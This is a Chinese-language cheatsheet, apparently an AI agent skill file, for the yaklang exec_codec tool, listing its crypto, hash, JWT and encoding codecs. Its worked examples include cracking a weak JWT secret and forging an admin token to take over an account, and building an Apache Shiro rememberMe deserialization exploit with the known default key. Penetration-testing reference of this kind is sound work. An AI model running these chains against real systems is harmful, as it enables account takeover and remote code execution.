---
name: exec-codec
description: 调用前必看:mcpyaklangcodecmethoddetails {method: ["AESEncrypt"]} 拿确切参数名(不同 codec 参数名差异大) 替代 openssl / pycryptodome / CyberChef,30+ codec 支持链式调用
category: cheatsheet
---

# exec_codec 速查 (toolPlus)

← [mcp-tools-finder.md](../mcp-tools-finder.md) | 适用工具:`mcp__yaklang__exec_codec`

> **调用前必看**:`mcp__yaklang__codec_method_details {method: ["AESEncrypt"]}` 拿确切参数名(不同 codec 参数名差异大)
> 替代 openssl / pycryptodome / CyberChef,30+ codec 支持链式调用

---

## §1 对称加密

| Codec | 用途 | 关键参数 |
|---|---|---|
| `AESEncrypt` / `AESDecrypt` | AES(ECB/CBC) | key / iv / mode |
| `AESGCMEncrypt` / `AESGCMDecrypt` | AES GCM | key / iv / aad |
| `AESEncryptKDF` / `AESDecryptKDF` | AES + KDF | key / salt / iterations |
| `SM4Encrypt` / `SM4Decrypt` | 国密 SM4 | key / iv / mode |
| `DESEncrypt` / `DESDecrypt` | DES(淘汰但还在用) | key / mode |
| `TripleDESEncrypt` / `TripleDESDecrypt` | 3DES | key / mode |

## §2 非对称

| Codec | 用途 |
|---|---|
| `RSAEncrypt` / `RSADecrypt` | RSA 公私钥 |
| `RSASign` / `RSAVerify` | RSA 签名 |
| `SM2Encrypt` / `SM2Decrypt` | 国密 SM2 |

## §3 Hash / HMAC

| Codec | 用途 |
|---|---|
| `MD5` / `SHA1` / `SHA2` | 哈希 |
| `SM3` | 国密哈希 |
| `Hmac` | HMAC(sha1/256/512) |
| `Cmac` | CMAC |
| `CbcMac` | CBC-MAC |

## §4 JWT(★高频)

| Codec | 用途 |
|---|---|
| `JwtParse` | 解 JWT 看 alg/header/payload |
| `JwtSign` | 用密钥签 JWT |
| `JwtReverseSign` | 反推 JWT 弱密钥 |

## §5 Java 序列化

| Codec | 用途 |
|---|---|
| `JavaSerialize` / `JavaUnserialize` | Java 原生序列化 |

## §6 编码 / 解码

| Codec | 用途 |
|---|---|
| `Base64Encode` / `Base64Decode` | base64 |
| `HexEncode` / `HexDecode` | 十六进制 |
| `URLEncode` / `URLDecode` | URL |
| `HtmlEncode` / `HtmlDecode` | HTML 实体 |
| `UnicodeEncode` / `UnicodeDecode` | Unicode |
| `StrQuote` / `StrUnQuote` | 字符串引号 |
| `UTF8ToCharset` / `CharsetToUTF8` | 字符集 |
| `GB18030ToUTF8` | 中文字符集 |

## §7 Fuzz / Mutate

| Codec | 用途 |
|---|---|
| `Fuzz` | 触发 fuzztag(内嵌引擎) |
| `HTTPRequestMutate` | HTTP 请求变种 |
| `Replace` / `Find` | 替换 / 查找 |
| `Packet2cURL` | HTTP 请求转 curl |
| `MakePacket` | 构造 HTTP 请求 |
| `JsonFormat` / `XMLFormat` | 格式化 |
| `CodecPlugin` / `CustomCodecPlugin` | 自定义 |

---

## §8 实战:链式调用

```json
{
  "tool": "mcp__yaklang__exec_codec",
  "text": "mobile=13800138000",
  "workFlow": [
    {
      "codecType": "URLEncode",
      "params": []
    },
    {
      "codecType": "AESEncrypt",
      "params": [
        {"key": "key", "value": "1234567890abcdef"},
        {"key": "iv", "value": "abcdef1234567890"},
        {"key": "mode", "value": "CBC"}
      ]
    },
    {
      "codecType": "Base64Encode",
      "params": []
    }
  ]
}
```

输出:URLEncode → AES-CBC 加密 → Base64 后的字符串(适合塞回 http_fuzzer 的 request)。

---

## §9 实战:JWT 三步

### 9.1 解 JWT 看 alg / payload

```json
{
  "text": "eyJhbGciOiJIUzI1NiI...",
  "workFlow": [{"codecType": "JwtParse", "params": []}]
}
```

### 9.2 反推弱密钥

```json
{
  "text": "eyJhbGciOiJIUzI1NiI...",
  "workFlow": [{
    "codecType": "JwtReverseSign",
    "params": [
      {"key": "wordlist", "value": "secret\n123456\nadmin\npassword"}
    ]
  }]
}
```

### 9.3 用密钥签新 JWT(改 user_id 接管)

```json
{
  "text": "{\"user_id\":1,\"role\":\"admin\"}",
  "workFlow": [{
    "codecType": "JwtSign",
    "params": [
      {"key": "alg", "value": "HS256"},
      {"key": "key", "value": "<反推出的弱密钥>"}
    ]
  }]
}
```

---

## §10 实战:Shiro 利用链构造

```json
{
  "text": "<ysoserial CommonsBeanutils1 序列化 payload base64>",
  "workFlow": [
    {"codecType": "Base64Decode", "params": []},
    {
      "codecType": "AESEncrypt",
      "params": [
        {"key": "key", "value": "kPH+bIxk5D2deZiIxcaaaA=="},
        {"key": "mode", "value": "CBC"}
      ]
    },
    {"codecType": "Base64Encode", "params": []}
  ]
}
```

输出可直接塞 Shiro `rememberMe` cookie。

---

## §11 常见错误

| 错误 | 原因 |
|---|---|
| `method not found` | 名字写错,先调 `codec_method_details {method: ["..."]}` 查 |
| `param key 不识别` | 不同 codec 参数名不一样(如 AES 用 `key`/`iv`/`mode`,RSA 用 `publicKey`/`privateKey`)— 用 `codec_method_details` 查 |
| 解密结果是乱码 | key/iv/mode 不对,或源数据本身经过了额外编码(如先 URLDecode 再解密) |
| Java 序列化反序列化失败 | 数据已被 Shiro / Fastjson 二次加密 — 先 base64 decode → AES decrypt → 再 JavaUnserialize |

---

*exec_codec cheatsheet v1.0 — 2026-05-24*
